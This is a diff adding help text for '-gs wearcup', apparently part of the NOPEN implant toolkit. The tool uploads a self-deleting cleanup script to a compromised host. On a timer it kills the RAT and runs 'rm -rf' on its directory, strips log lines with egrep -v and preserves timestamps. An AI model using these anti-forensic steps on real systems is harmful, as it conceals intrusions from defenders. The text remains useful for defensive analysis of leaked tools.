@@ -1,0 +1,70 @@
+
+Usage: -gs wearcup [-h | options]
+
+OPTIONS [defaults]
+
+-w delay     Have cup sleep for this long before firing. ("delay"
+             can be in the format: [#h][#m]#[s])                   [3h]
+-p           Instead of using fuser to kill, just outright "kill -9"
+             this NOPEN server's pid and (if not 1) its parent pid.
+             This can be useful if you have no working directory any
+             longer and the NOEPN binary is already deleted, but there
+             is still something you want done AFTER NOPEN is gone (with
+             -C or -A, or both).
+-P pidlist   When using -p, also kill -9 these pids. List must be
+             comma delimited integers greater than one.
+             NOTE:  Use care here, obviously.
+-d /dir      Use this directory as the one to wipe and/or the one
+             running binaries that need killing.            [NOPEN cwd]
+-W           Skip the dir wipe ("rm -rf /dir") step.
+-D           Debug mode--build cup.auto but just show it and exit.
+-r rmtname   Run cup on target as "name".                         [cup]
+-C           Clean some log entries from one or more files. You are
+             prompted for the file to clean, and the regexp to egrep -v
+             out of it. This works on Solaris 2.6+ syslogd files and
+             most any Linux, too.
+-t           Used with -C, this uses the "touch -r" command to try to
+             preserve the timestamp of the file(s) being cleaned.
+             Probably this is not needed--the timestamp is probably
+             roughly current, anyway. Note that this will leave a
+             current ctime, though.
+-A           Run some more commands after cleanup (use -C for egrep -v
+             style log cleaning, though). You are prompted for the
+             commands to run.
+-T file(s)   File names (comma delimited) of binaries in /dir to kill
+             with fuser (required when -W is used, since we do not want
+             to assume we kill all of /dir/* in that case).
+-F file(s)   Full path to target's "fuser" program. Without -F,
+             -gs wearcup will verify the usual location will work. Can
+             be a comma delimited list of several files to try.
+-R           Reset--remove previously set/verified fuser and find it
+             again.
+
+NOTE about -C/-A: Keep in mind no one will see any output from these
+                  commands as they are done after the RAT is killed.
+
+-gs wearcup builds /current/up/cup.auto according to the chosen
+options, shows the final result, then allows user to either abort or
+continue and upload/run cup.auto on target as "./rmtname &".
+
+cup.auto will be patterned after the original shell script cup. Cup
+stands for "Clean UP" and is most often run on HP, since a running
+binary cannot be deleted there.
+
+When run, cup will delete itself and then sleep the desired delay. Once
+the sleep expires or is killed, cup then uses either fuser or kill -9
+to kill the desired processes, and then wipes the desired files and/or
+directories.
+
+-gs wearcup can be run at the beginning of an op. Default sleep time is
+three hours. When the op is done, DO NOT BURN NOPEN! Instead, send the
+sleep's pid (NOT CUP's pid and NOT NOPEN's pid) a "kill -9". This will
+trigger the rest of the commands in the uploaded cup script to execute,
+namely killing off the NOPEN server and its children and cleaning and
+deleting the directory.
+[2;31m
+AGAIN: DO NOT BURN NOPEN WITH -burn WHEN CUP IS REQUIRED TO DELETE
+       THE NOPEN BINARY RUNNING.
+[0;39m
+
+-gs wearcup version 2.2.2.2
